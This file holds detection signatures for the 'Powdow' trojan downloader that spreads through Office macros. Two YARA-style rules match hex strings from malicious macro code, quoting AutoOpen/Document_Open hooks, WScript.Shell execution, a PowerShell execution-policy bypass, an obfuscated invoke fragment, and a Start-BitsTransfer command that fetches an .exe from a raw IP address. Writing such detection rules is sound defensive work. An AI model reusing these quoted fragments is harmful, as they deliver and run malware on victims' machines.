
rule TrojanDownloader_O97M_Powdow_RVH_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 } //1 CreateObject("Shell.Application")
		$a_01_1 = {22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 64 72 69 76 65 68 6f 6c 64 2e 62 61 74 22 } //1 "C:\Users\Public\Documents\drivehold.bat"
		$a_01_2 = {22 70 6f 77 65 72 73 22 0d 0a 72 73 68 65 6c 6c 20 3d 20 22 68 65 6c 6c 22 } //1
		$a_01_3 = {53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 70 3a 2f 2f 32 31 32 2e 31 39 32 2e 32 34 31 2e 39 34 2f 6e 65 77 73 2f 49 4d 47 5f 31 30 38 31 30 30 37 30 30 33 78 6c 73 2e 65 78 65 } //1 Start-BitsTransfer -Source http://212.192.241.94/news/IMG_1081007003xls.exe
		$a_01_4 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 66 69 65 6c 64 77 69 74 68 2e 65 78 65 } //1 C:\Users\Public\Documents\fieldwith.exe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_RVH_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 06 00 00 "
		
	strings :
		$a_01_0 = {77 73 68 20 3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //1 wsh = VBA.CreateObject("WScript.Shell")
		$a_03_1 = {65 72 72 6f 72 43 6f 64 65 20 3d [0-09] 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 62 79 70 61 73 73 } //1
		$a_01_2 = {41 75 74 6f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 72 73 68 } //1
		$a_01_3 = {77 73 68 2e 52 75 6e 28 70 61 79 2c 20 77 69 6e 64 6f 77 53 74 79 6c 65 2c 20 77 61 69 74 4f 6e 52 65 74 75 72 6e 29 } //1 wsh.Run(pay, windowStyle, waitOnReturn)
		$a_01_4 = {2e 52 45 41 64 74 6f 65 4e 64 28 29 27 29 2d 27 6b 53 65 27 2c 5b 5d 33 39 20 20 2d 28 5b 5d 34 39 2b 5b 5d 38 34 2b 5b 5d 31 32 30 29 2c 5b 5d 31 32 34 20 2d 28 5b 5d 37 30 2b 5b 5d 31 30 32 2b 5b 5d 31 32 32 29 2c 5b 5d 33 36 29 20 7c 20 26 20 28 20 24 50 53 48 6f 6d 65 5b 34 5d 2b 24 50 53 48 6f 6d 65 5b 33 34 5d 2b 27 78 27 29 22 2c 20 77 69 6e 64 6f 77 53 74 79 6c 65 2c 20 77 61 69 74 4f 6e 52 65 74 75 72 6e 29 } //1 .REAdtoeNd()')-'kSe',[]39  -([]49+[]84+[]120),[]124 -([]70+[]102+[]122),[]36) | & ( $PSHome[4]+$PSHome[34]+'x')", windowStyle, waitOnReturn)
		$a_01_5 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 72 73 68 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=5
 
}